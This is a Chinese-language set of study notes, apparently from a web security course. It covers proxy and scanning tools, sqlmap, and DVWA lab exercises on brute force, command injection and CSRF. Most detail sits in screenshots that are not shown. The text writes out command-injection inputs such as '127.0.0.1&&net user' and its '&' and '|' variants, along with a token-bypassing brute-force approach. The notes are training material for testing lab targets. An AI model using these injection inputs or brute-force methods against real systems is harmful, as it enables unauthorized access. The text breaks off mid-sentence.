href="#3-Web安全工具" class="headerlink" title="3 Web安全工具"></a>3 Web安全工具</h1><h2 id="1-浏览器和浏览器拓展初级"><a href="#1-浏览器和浏览器拓展初级" class="headerlink" title="1 浏览器和浏览器拓展初级"></a>1 浏览器和浏览器拓展初级</h2><h3 id="1-安全测试之浏览器入门"><a href="#1-安全测试之浏览器入门" class="headerlink" title="1 安全测试之浏览器入门"></a>1 安全测试之浏览器入门</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569741893168.png" alt="1569741893168"></p><p>hackbar基本功能介绍</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569742115066.png" alt="1569742115066"></p><p>编辑cookie类插件为firebug浏览器提供快速修改、增加、删除cookie的功能</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569744284170.png" alt="1569744284170"></p><p>proxy switcher的用法结合抓包工具更好</p><p>学会清理缓存，第二个还可以采用隐身模式</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569746320921.png" alt="1569746320921"></p><h2 id="2-代理抓包分析工具"><a href="#2-代理抓包分析工具" class="headerlink" title="2 代理抓包分析工具"></a>2 代理抓包分析工具</h2><p><strong>代理工作原理</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747039370.png" alt="1569747039370"></p><p><strong>浏览器代理设置</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747175452.png" alt="1569747175452"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747244758.png" alt="1569747244758"></p><p>设置过程偏繁琐 ===》proxy switcher</p><p>界面</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747328239.png" alt="1569747328239"></p><p>设置</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747357777.png" alt="1569747357777"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749176245.png" alt="1569749176245"></p><p><strong>常用HTTP代理工具</strong></p><ul><li>Burpsuite</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749423351.png" alt="1569749423351"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749454630.png" alt="1569749454630"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749471180.png" alt="1569749471180"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749545731.png" alt="1569749545731"></p><ul><li>Charles</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749560706.png" alt="1569749560706"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749574749.png" alt="1569749574749"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749598954.png" alt="1569749598954"></p><ul><li>Fiddler</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749614434.png" alt="1569749614434"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749632951.png" alt="1569749632951"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749647235.png" alt="1569749647235"></p><h2 id="3-Web漏洞扫描工具初级"><a href="#3-Web漏洞扫描工具初级" class="headerlink" title="3 Web漏洞扫描工具初级"></a>3 Web漏洞扫描工具初级</h2><h3 id="1-敏感文件探测"><a href="#1-敏感文件探测" class="headerlink" title="1 敏感文件探测"></a>1 敏感文件探测</h3><p><strong>什么是敏感文件？</strong></p><p>​        敏感文件对于网站来说，就像是网站（网站管理员）的秘密日记，这个文件如果没有保护好，被访问者发现了，就有可能暴露站点的脆弱性或保密数据</p><p><strong>常见的“敏感文件”类型</strong></p><ul><li><p>网站管理后台</p></li><li><p>数据文件</p></li><li><p>备份文件</p></li><li><p>Webshell</p></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569755345599.png" alt="1569755345599"></p><p><strong>敏感文件探测原理</strong></p><p>​         猜测文件名，然后根据返回的HTTP状态码判断文件是否存在</p><ul><li>200：文件存在</li><li>301：跳转</li><li>404：文件不存在</li></ul><p>详情：HTTP状态码详解</p><p><a href="http://tool.oschina.net/commons?type=5">http://tool.oschina.net/commons?type=5</a></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569757792815.png" alt="1569757792815"></p><p>第一次扫描</p><p><strong>目标站点</strong>：    <code>http://testasp.vulnweb.com   和  http://testphp.vulnweb.com</code></p><p>字典选择（参考）：<code>ASP.txt  DIR.txt、MDB.txt、PHP.txt</code></p><p>改进思路：</p><p>首先思考：字典越大越好吗？   ===&gt;将字典分类存好，如php、sap等等</p><p><strong>问题1：</strong>PHP的站点用ASP的字典去扫描不是在做无用功吗？</p><p>如何判断常见网站脚本类型？（ASP/PHP/ASPX/JSP等）</p><p><strong>一个简单的方法：</strong>判断index的文件类型</p><p><strong>查看</strong>：index.asp     |    index.php    |    index.aspx    |    index.jsp等是否存在</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569758678976.png" alt="1569758678976"></p><p><strong>问题2</strong>:每个网站都有所不同，通用的字典针对性差，命中率低</p><p>如何生成针对性字典？</p><p>举例说明：以构造针对性的备份文件字典为例</p><p>目标站点：<code>http://textphp.vulnweb.com</code></p><p>可能存在的备份文件名：testphpvulnwebcom.rar    |    vulnweb.com.rar    |    TESTPHP.VULNWEB.COM.rar    …….</p><p>分享一个Python小程序：根据URL生成目标备份文件猜测字典</p><p><strong>任务</strong>：阅读Python源代码，思考字典生成思路</p><h3 id="2-漏洞扫描工具入门"><a href="#2-漏洞扫描工具入门" class="headerlink" title="2 漏洞扫描工具入门"></a>2 漏洞扫描工具入门</h3><p>AWVS    |    Netsparker    |    AppScan</p><p>一款优秀的漏洞扫描器是一批安全专家将自己基类的’测试手法’和’测试经验’自动化的产物，是宝贵的只会结晶</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569773534024.png" alt="1569773534024"></p><p>问题1：使用漏扫工具需要明确的问题</p><p>​        对目标站点的误伤：如高流量、请求了危险功能（如删除数据库）</p><p>问题2：漏洞评级问题</p><pre><code> 技术角度    +     业务角度</code></pre><p>问题3：漏扫结果的解读和运用</p><ol><li>测试用例可能需要调整</li><li>误报和漏报</li><li>将扫描结果作为人工测试的线索</li></ol><h3 id="3-SQL注入漏洞测试入门"><a href="#3-SQL注入漏洞测试入门" class="headerlink" title="3  SQL注入漏洞测试入门"></a>3  SQL注入漏洞测试入门</h3><ul><li><p>SQL注入的成因是因为服务器要<strong>执行的数据库代码拼接了用户输入的数据</strong></p></li><li><p>SQL注入漏洞的典型危害是可以被用来<strong>获取数据库敏感数据（拖库）</strong></p></li></ul><p>命令行工具：</p><ul><li>只需关注输入和输出</li><li>看到流程化的执行细节</li></ul><p>sqlmap是一款开源的SQL<strong>注入</strong>漏洞<strong>检测</strong>与<strong>利用</strong>神器</p><p><strong>发现和利用SQL注入漏洞基本流程</strong></p><ul><li>找到有数据库交互的功能页面</li><li>判断页面是否存在SQL注入</li><li>利用SQL注入漏洞读取数据</li><li>导出所需数据保存</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569906960437.png" alt="1569906960437"></p><p><strong>小技巧：</strong>字母缩写前一个-，完整单词是两个–</p><p><code>python2 sqlmap.py -u &quot;http://xxx&quot;</code>   (双引号可以加也可以不加)</p><p>注意：实际环境中，确定注入点以及基本的信息就可以了</p><p>注入尝试：GET、 POST</p><p>了解：level和risk参数的作用</p><h3 id="4-在线工具使用"><a href="#4-在线工具使用" class="headerlink" title="4 在线工具使用"></a>4 在线工具使用</h3><p><strong>海量数据如何找到</strong></p><ul><li>搜索引擎语法</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569921272902.png" alt="1569921272902"></p><p>google hack技术：指用google等搜索引擎对某些特定的网络主机漏洞（通常是服务器上的漏洞脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的</p><p>各种语法自行百度</p><ul><li>网络空间搜索：shodan、zoomey 、fofa</li></ul><p>找到他们的用户手册，进行实际练习</p><p>基本原理：探测/爬取   —-&gt;   识别/打标签  —–&gt;  存储共检索</p><ul><li>在web工具：whatweb.net/<a href="http://www.ipip.net/www.cmd5.com/tool.chinaz.com">www.ipip.net/www.cmd5.com/tool.chinaz.com</a></li></ul><h1 id="4-web安全实践"><a href="#4-web安全实践" class="headerlink" title="4 web安全实践"></a>4 web安全实践</h1><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569930602302.png" alt="1569930602302"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569930628060.png" alt="1569930628060"></p><p>dvwa和dsvw系统</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569930729089.png" alt="1569930729089"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569930980916.png" alt="1569930980916"></p><p>误区：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931076179.png" alt="1569931076179"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931095277.png" alt="1569931095277"></p><p>示例：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931504754.png" alt="1569931504754"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931517881.png" alt="1569931517881"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931547980.png" alt="1569931547980"></p><h2 id="1-DVWA部署"><a href="#1-DVWA部署" class="headerlink" title="1 DVWA部署"></a>1 DVWA部署</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006086457.png" alt="1570006086457"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006272662.png" alt="1570006272662"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006299028.png" alt="1570006299028"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006314933.png" alt="1570006314933"></p><p>渗透测试神器：</p><ul><li>firebug</li><li>Hackbar</li><li>Tamper Data</li><li>Proxy Switcher</li></ul><p>部署web服务器环境</p><ul><li>XAMPP</li></ul><p>部署Web 渗透测试环境</p><ul><li>DVWA</li></ul><h2 id="2-暴力破解"><a href="#2-暴力破解" class="headerlink" title="2 暴力破解"></a>2 暴力破解</h2><p>行李箱的破解</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006984474.png" alt="1570006984474"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007016016.png" alt="1570007016016"></p><p><strong>owasp zap</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007374782.png" alt="1570007374782"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007405634.png" alt="1570007405634"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007533265.png" alt="1570007533265"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007579749.png" alt="1570007579749"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007608420.png" alt="1570007608420"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007638522.png" alt="1570007638522"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007705834.png" alt="1570007705834"></p><p>此时这个数据报是什么样子的呢？</p><p>使用owasp，实战操作</p><ul><li>firebug代理设置</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570072960353.png" alt="1570072960353"></p><ul><li>ZAP代理设置</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570072995702.png" alt="1570072995702"></p><ul><li>抓包</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570074171472.png" alt="1570074171472"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570080377466.png" alt="1570080377466"></p><p>自己的实际情况：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570087449266.png" alt="1570087449266"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570087688279.png" alt="1570087688279"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088180579.png" alt="1570088180579"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088196245.png" alt="1570088196245">     </p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088342455.png" alt="1570088342455"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088423869.png" alt="1570088423869"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570090575987.png" alt="1570090575987"></p><p>于是我们设置好了<code>usename</code>字典</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088776053.png" alt="1570088776053"></p><p>于是我们设置好了 <code>password</code>字典</p><p>接下来就是暴力破解</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088922565.png" alt="1570088922565"></p><p>输出结果</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570090662135.png" alt="1570090662135"></p><p>这里我们使用的DVWA Security是低等级（ms时间单位），如果是中等（s时间单位）的话，也可以破解出来，唯一的区别在于时间变长了 。通过查看源代码发现，每次登陆失败都会<code>sleep(2)</code>，即暂停两秒，增加了破解的时间成本</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570089630597.png" alt="1570089630597"></p><p>抓包发现每次登陆参数user_token都是动态改变且不可预测的随机字符串</p><p><strong>思考</strong>：user_token是从哪里来的？</p><p>回答：<strong>下一次的user_token会在上一次的响应包里返回给浏览器</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091006396.png" alt="1570091006396"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091042929.png" alt="1570091042929"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091092240.png" alt="1570091092240"></p><p>针对这样的情况我们能不能攻破呢？答案是肯定的，我门需要重新设计<strong>破解动作</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091214455.png" alt="1570091214455"></p><p><strong>破解动作：</strong>访问首页——获得usertoken参数——发送带usertoken的登录数据包</p><p>写下破解的伪代码</p><p>###<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091607329.png" alt="1570091607329"></p><p>在运行脚本前需要修改自己的本地ip地址和自己登录的PHPSESSID</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570092769125.png" alt="1570092769125"></p><ul><li>限制错误登录次数</li><li>验证码</li></ul><h2 id="3-命令注入"><a href="#3-命令注入" class="headerlink" title="3 命令注入"></a>3 命令注入</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570093193386.png" alt="1570093193386"></p><ul><li>命令：指<strong>操作系统命令</strong></li><li>注入：通过Web程序<strong>在服务器上</strong>拼接系统命令</li></ul><h3 id="实战："><a href="#实战：" class="headerlink" title="实战："></a><strong>实战</strong>：</h3><p>工具：firebug  和  DVWA</p><p>步骤：</p><ol><li>输入用户名“admin”，密码“password”，成功登录</li><li>进入DVWA Security，Security Level选择Low</li><li>进入Command Injection，是命令执行的主页面</li></ol><p>正常操作：输入IP地址——点击提交——显示结果</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094277544.png" alt="1570094277544"></p><p>如果结果显示是乱码，请这样做：</p><p><strong>在 …/DVWA/dvwa/includes目录下，有个dvwaPage.inc.php文件，打开文件在277行修改，将UTF-8改为GBK或者GB2312即可</strong></p><p>有没有觉得上面的结果和cmd下<strong>ping</strong>的结果很类似，其实就是它</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094341869.png" alt="1570094341869"></p><p>所以web程序调用了我们的系统命令</p><p><strong>命令注册流程</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094387800.png" alt="1570094387800"></p><ul><li><strong>确认可控字段：</strong></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094433914.png" alt="1570094433914"></p><ul><li><strong>确定命令语句</strong>：windows下如何连接两条命令，例如 <code>ping 127.0.0.1和net user</code>，方法是使用<code>&amp;&amp;</code>符号</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094563877.png" alt="1570094563877"></p><p>①操作一下：（记得将 DVWA Security设置为<strong>Low level</strong>）</p><p>在输入栏中输入：127.0.0.1&amp;&amp;net user</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094882552.png" alt="1570094882552"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094675271.png" alt="1570094675271"></p><p>有一个错误的发生</p><p>②将 DVWA Security设置为<strong>中等</strong>，看看结果：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570095039384.png" alt="1570095039384"></p><p>命令执行出错，猜测<code>&amp;&amp;</code>符号被<strong>过滤</strong>了</p><p><strong>思考</strong>如何去解决，windows下是不是还有其他的符号连接两个命令呢？</p><p>回答：一个<code>&amp;</code>也可以的</p><p>so，我们在中等安全等级下尝试下，是成功的</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570095206885.png" alt="1570095206885"></p><p>③我们将等级设置为高级的，发现是失败的，使用’&amp;&amp;’也是失败的</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570095324103.png" alt="1570095324103"></p><p><strong>思考</strong>：还有没第三个连接符</p><p><strong>回答</strong>：管道命令符<code>|</code>,就是将上一条命令传递给下一个命令</p><p>结果：ping命令没有显示，只显示了<code>net user</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570095456829.png" alt="1570095456829"></p><p>④将安全等级设置为<code>impossible</code>，结果是：<strong>有效地防止了命令注入</strong></p><p>可以<code>ping</code>通127.0.0.1，但是之前提到的那些连接符的命令都是失败的</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570096317089.png" alt="1570096317089"></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>使用白名单，而不是黑名单</p><p>因为如果过滤了敏感命令怎么办？</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101503640.png" alt="1570101503640"></p><p>通常来说，命令注入都是有回显的，如果没有该怎么办呢？</p><p><strong>解决：</strong></p><ol><li>延时注入</li><li>远程请求</li></ol><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101690138.png" alt="1570101690138"></p><ul><li>区分<code>&amp;,&amp;&amp;,|,||</code>:</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570100546558.png" alt="1570100546558"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101050646.png" alt="1570101050646"></p><h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4 CSRF"></a>4 CSRF</h2><p>举例</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101829770.png" alt="1570101829770"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101868786.png" alt="1570101868786"></p><p>受害者角度：用户在当前已登录的web应用程序上执行<strong>非本意</strong>的操作</p><p>攻击者角度：攻击者欺骗浏览器，让其<strong>以受害者的名义</strong>执行自己想要对操作</p><p>工具：firebug    |    DVWA    |    Tamper Data    |    Hackbar</p><p>步骤：</p><ol><li>输入用户名和密码，成功登录</li><li>进入DVWA Security，Security Level选择Low</li><li>进入CSRF，是CSRF攻击的主页面，是常见的修改密码功能</li></ol><p>正常操作：新密码——确认新密码——点击提交——重新登录验证</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104247968.png" alt="1570104247968"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104381352.png" alt="1570104381352"></p><p><strong>抓包</strong>：开启Tamper Data——三步操作——截获数据包</p><p><strong>分析：</strong>打开数据包——修改数据包——登录验证</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104713746.png" alt="1570104713746"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104748768.png" alt="1570104748768"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104789531.png" alt="1570104789531"></p><p><strong>攻击者原始思路：</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104837876.png" alt="1570104837876"></p><p><strong>构造HTML</strong>：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104864794.png" alt="1570104864794"></p><p><strong>构造链接</strong>——诱骗受害者点击——<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110388683.png" alt="1570110388683"></p><p>上面的操作都是建立在安全等级是Low Level上面的</p><p>②使用安全等级是中等</p><p>将low数据包和medium数据包进行比较</p><p>对比</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110574870.png" alt="1570110574870"></p><p><strong>尝试</strong>：截包——改referer发送——查看结果</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110776775.png" alt="1570110776775"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110800854.png" alt="1570110800854"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110811950.png" alt="1570110811950"></p><p><strong>修改过程中的思考：</strong></p><p><code>referer</code>：<code>http://127.0.0.1/DVWA-1.9/vulnerabilities/csrf/</code>   -——&gt;    ok</p><p><code>referer</code>：<code>http://127.0.0.1/</code>    ——&gt;ok</p><p><code>referer</code>：<code>127.0.0.1</code>     